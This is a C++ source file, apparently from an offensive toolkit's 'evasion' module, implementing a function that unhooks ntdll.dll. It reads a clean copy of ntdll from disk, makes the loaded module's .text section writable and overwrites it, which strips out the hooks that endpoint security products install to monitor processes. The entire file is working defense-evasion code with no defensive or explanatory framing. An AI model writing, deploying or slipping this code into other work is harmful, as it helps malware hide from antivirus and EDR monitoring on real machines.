#include "core/evasion/unhooker.hpp"
#include <windows.h>
#include <winternl.h>
#include <psapi.h>
#include <iostream>

bool Unhooker::UnhookNtdll() {
    HANDLE hProcess = GetCurrentProcess();
    MODULEINFO mi = {0};
    HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
    
    if (!ntdllModule || !GetModuleInformation(hProcess, ntdllModule, &mi, sizeof(mi))) 
        return false;

    // Get ntdll from disk
    HANDLE ntdllFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (ntdllFile == INVALID_HANDLE_VALUE) return false;

    HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!ntdllMapping) {
        CloseHandle(ntdllFile);
        return false;
    }

    LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);
    if (!ntdllMappingAddress) {
        CloseHandle(ntdllMapping);
        CloseHandle(ntdllFile);
        return false;
    }

    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)ntdllMappingAddress;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllMappingAddress + dosHeader->e_lfanew);

    for (WORD i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(ntHeaders) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
        
        if (!strcmp((char*)sectionHeader->Name, ".text")) {
            LPVOID lpAddress = (LPVOID)((DWORD_PTR)ntdllModule + (DWORD_PTR)sectionHeader->VirtualAddress);
            LPVOID lpSource = (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)sectionHeader->VirtualAddress);
            SIZE_T szSize = sectionHeader->Misc.VirtualSize;
            
            DWORD oldProtect;
            if (VirtualProtect(lpAddress, szSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(lpAddress, lpSource, szSize);
                VirtualProtect(lpAddress, szSize, oldProtect, &oldProtect);
            }
        }
    }

    UnmapViewOfFile(ntdllMappingAddress);
    CloseHandle(ntdllMapping);
    CloseHandle(ntdllFile);
    
    return true;
}
